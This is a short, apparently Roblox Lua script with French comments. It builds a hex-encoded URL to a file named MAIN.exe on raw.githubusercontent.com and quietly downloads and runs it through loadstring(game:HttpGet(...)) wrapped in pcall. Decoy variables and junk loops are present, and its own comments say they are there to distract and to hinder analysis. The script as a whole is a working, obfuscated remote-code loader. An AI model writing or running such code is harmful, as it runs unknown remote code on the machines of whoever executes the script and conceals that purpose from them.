         
local function computeValue(a, b)
    return (a * b) / (a + b + 1)
end

local function processNumbers()
    local total = 0
    for i = 1, 100 do
        total = total + (i % 3)
    end
    return total
end

-- Variables non utilisées mais présentes pour distraire
local bufferData = "4b2f99" .. "a7d"
local computationResult = 125 + 75
local infoTable = { "alpha", "beta", computeValue(3, 5) }
local cacheMemory = {math.random(1, 100), math.sin(0.5), processNumbers()}

-- Fonction pour convertir un texte encodé en hexadécimal en chaîne de caractères
local function decodeHex(hex)
    return hex:gsub("..", function(cc) return string.char(tonumber(cc, 16)) end)
end

-- Données encodées en hexadécimal (URL masquée)
local part1 = "68747470733a2f2f7261772e"  -- "https://raw."
local part2 = "67697468756275736572636f6e74656e742e636f6d2f"  -- "githubusercontent.com/"
local part3 = "436c6d7374625465616d4f72696f6e2f4d61696e536372697074652f"  -- "ClmstbTeamOrion/MainScripte/"
local part4 = "726566732f68656164732f6d61696e2f4d41494e2e657865"  -- "refs/heads/main/MAIN.exe"

-- Construction progressive de l'URL
local urlPath = decodeHex(part1) .. decodeHex(part2) .. decodeHex(part3) .. decodeHex(part4)

-- Ajout d'opérations inutiles pour rendre le code plus difficile à analyser
for i = 1, 10 do
    table.insert(cacheMemory, math.random(1, 100))
end

-- Exécution discrète du script
pcall(function()
    loadstring(game:HttpGet(urlPath, true))()
end)

-- Dernière fonction pour ajouter de la complexité au script
local function generateKey()
    return "SessionKey_" .. tostring(math.random(1, 1000))
end

print(generateKey())
